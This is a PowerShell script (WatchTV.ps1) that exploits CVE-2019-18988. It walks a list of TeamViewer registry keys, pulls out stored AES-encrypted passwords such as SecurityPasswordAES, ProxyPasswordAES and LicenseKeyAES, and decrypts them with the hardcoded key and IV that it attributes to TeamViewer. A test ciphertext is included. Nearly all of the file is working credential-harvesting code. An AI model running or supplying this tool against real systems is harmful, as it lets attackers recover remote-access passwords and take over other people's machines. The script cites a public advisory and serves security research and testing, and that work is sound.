<#
    FileName: WatchTV.ps1
    Author: Manfred Heinz (@zaphoxx,@manniTV)
    CVE: CVE-2019-18988
    Last Update: 26.03.2020
    Licens: GNU GPLv3
    Required Dependencies: None
    Optional Dependencies: None
    References:
        https://whynotsecurity.com/blog/teamviewer/
        https://gist.github.com/ctigeek/2a56648b923d198a6e60
	https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-18988
    
    .SYNOPSIS
        The main purpose of this script is to retrieve TeamViewers encrypted
        passwords from the Windows registry and to decrypt them. 
	Based on CVE-2019-18988.

    .DESCRIPTION
        The script uses a predefined set of registry locations and properties.
        This whole script is mainly based on the description and scripts provided
        on https://whynotsecurity.com/blog/teamviewer/. I just thought a powershell
        version for this windows specific task would be nice to have.
	See also CVE-2019-18988 for more information.

    .EXAMPLE
        The file contains an example encrypted password 
        $testCipher
        run "Decrypt-Password($testCipher)" as decryption example
#>

$TheAnnoyingAsciiArt = @"

#################L   .###############u
##################N.@################ *
##################################### '>.n=L
###############################RR#### 'b"  9
###########################R#"  .#### @   .*
########################^   .e#######P   e"
#####################R#    o########P   @
###################P" .e> 4#" '####F  .F
#################R  .###& '#   ####  .#>
#################b.o#####  #N  "##" ."'>
#########################  ##N  "^ .# '>
############## "########R  ###&    ## '>
##############  E"##P^9#E  ####   8## '>
##############  E  "  9#F  ####k .### '>
##############  E     9#N  ########## '>
##############  E     9##.u########## '>
############## o"     9############## d
**************#       ***************
ManniTV
"@

function Get-TeamViewPasswords {
    <#
        .SYNOPSIS
            
            The main function that tries to retrieve and decrypt TeamViewer 
	        passwords stored in the windows registry.
        
        .EXAMPLE
	    
            Get-TeamViewPasswords
            There are currently no other options available
    #>
    Write-Output($TheAnnoyingAsciiArt)

    $keys = @()
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer","Version")
    $keys += ,@("HKLM:\\SOFTWARE\\TeamViewer\\Temp","SecurityPasswordExported")
    $keys += ,@("HKLM:\\SOFTWARE\\TeamViewer","Version")
    #$keys += ,@("HKCU:\\Environment","Path")
    
    # All potentially interesting properties containing encrypted passwords.
    $properties = "OptionsPasswordAES","SecurityPasswordAES","SecurityPasswordExported","ServerPasswordAES","ProxyPasswordAES","LicenseKeyAES"


    $keys.ForEach({
        if (Test-Path -Path $_[0]){
	        write-output("")
	        $value=get-itemproperty -Path $_[0] | select -ExpandProperty $_[1]
            if ($value) {
                    write-output("[+] "+$_[0])
                    write-output([char]9+"[-] "+$_[1]+" : "+$value)
                    $path=$_[0]
                    $version=$_[1]
                    $properties.ForEach({
                            $propertyValue=get-itemproperty -Path $path -ErrorAction SilentlyContinue | select -ExpandProperty $_ -ErrorAction SilentlyContinue
                            if ($propertyValue) {
                                    write-output([char]9+[char]9+"[+] "+$_+" : "+ $propertyValue)
                                    write-output([char]9+[char]9+"[+] decrypt password ...")
                                    $pass = decrypt-password($propertyValue)
                                    if ($pass) {
                                        write-output([char]9+[char]9+"[+] decrypted password: " + $pass)
                                    }
                                    else{
                                        write-output([char]9+[char]9+"[!] !Could Not Decrypt Encoded Password!")
                                    }
                            }
                    })
            }
        }
    })
}


function Create-AesManagedObject() {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    
    # You might want to choose a different paddingMode than that
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128

    # These are the secret_key and IV used by TeamViewer
    $key = 0x06,0x02,0x00,0x00,0x00,0xa4,0x00,0x00,0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00
    $iv  = 0x01,0x00,0x01,0x00,0x67,0x24,0x4f,0x43,0x6e,0x67,0x62,0xf2,0x5e,0xa8,0xd7,0x04
    
    $aesManaged.IV = $iv
    $aesManaged.KEY = $key
    $aesManaged
}

function Decrypt-Password($encryptedBytes) {
    # The function expects a bytes array as input for the encrypted string
    
    $aesManaged = Create-AesManagedObject
    $decryptor = $aesManaged.CreateDecryptor();

    # decrypt the whole shebang
    $unencryptedData = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length);
    $aesManaged.Dispose()
    
    # finale encode the bytes back into readable text
    [System.Text.Encoding]::UTF8.GetString($unencryptedData)
}

# This is a testcase for reference
# just run "Decrypt-Password($testCipher)" to check if everything works out.

$testCipher = 0xd6,0x90,0xa9,0xd0,0xa5,0x92,0x32,0x7f,0x99,0xbb,0x4c,0x6a,0x6b,0x6d,0x4c,0xbe
